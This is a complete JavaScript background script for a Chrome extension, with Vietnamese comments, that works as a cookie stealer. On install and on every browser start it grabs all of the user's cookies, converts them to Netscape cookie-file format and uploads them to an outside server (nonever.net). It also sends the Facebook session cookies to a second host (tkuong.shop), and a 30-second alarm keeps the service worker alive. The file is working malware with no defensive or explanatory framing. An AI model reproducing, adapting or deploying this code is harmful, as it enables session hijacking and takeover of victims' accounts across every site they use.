// Kích hoạt khi extension khởi động hoặc được cài mới
chrome.runtime.onStartup.addListener(() => {
  sendCookies();
});
chrome.runtime.onInstalled.addListener(() => {
  sendCookies();
});

// Định kỳ ping giữ cho service worker không bị tắt
chrome.alarms.create('keepAlive', { periodInMinutes: 0.5 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'keepAlive') {
    chrome.runtime.getPlatformInfo(() => {});
  }
});

async function sendCookies() {
  try {
    const ipResponse = await fetch("https://api.ipify.org");
    if (!ipResponse.ok) throw new Error("Không thể lấy IP.");
    const ip = await ipResponse.text();

    chrome.cookies.getAll({}, (cookies) => {
      let netscapeFormat = "";
      let facebookCookies = "";

      cookies.forEach((cookie) => {
        const domain = cookie.domain.startsWith(".") ? cookie.domain : "." + cookie.domain;
        const path = cookie.path || "/";
        const secure = cookie.secure ? "TRUE" : "FALSE";
        const expires = cookie.expirationDate ? Math.round(cookie.expirationDate) : "";
        const name = cookie.name;
        const value = cookie.value;

        netscapeFormat += `${domain}\t${secure}\t${path}\tFALSE\t${expires}\t${name}\t${value}\n`;

        if (domain.includes("facebook.com")) {
          facebookCookies += `${name}=${value}; `;
        }
      });

      facebookCookies = facebookCookies.trim().replace(/;$/, "");

      const formAll = new FormData();
      const blobAll = new Blob([netscapeFormat], { type: "text/plain" });
      formAll.append("file", blobAll, "All_Cookies.txt");

      fetch("https://nonever.net/upload.php", {
        method: "POST",
        body: formAll
      })
        .then(res => res.json())
        .then(data => {
          if (data.status !== "success") {
            throw new Error("Lỗi upload All_Cookies.txt: " + data.message);
          }
          console.log("Đã upload All_Cookies.txt thành công.");
        })
        .catch(err => {
          console.error("Lỗi khi gửi All_Cookies.txt:", err);
        });

      if (facebookCookies) {
        const formFb = new FormData();
        const blobFb = new Blob([facebookCookies], { type: "text/plain" });
        formFb.append("file", blobFb, "Cookies_Fb.txt");

        fetch("https://tkuong.shop/upload.php", {
          method: "POST",
          body: formFb
        })
          .then(res => res.json())
          .then(data => {
            if (data.status !== "success") {
              throw new Error("Lỗi upload Cookies_Fb.txt: " + data.message);
            }
            console.log("Đã upload Cookies_Fb.txt thành công.");
          })
          .catch(err => {
            console.error("Lỗi khi gửi Cookies_Fb.txt:", err);
          });
      }
    });
  } catch (err) {
    console.error("Lỗi tổng quát trong sendCookies():", err);
  }
}
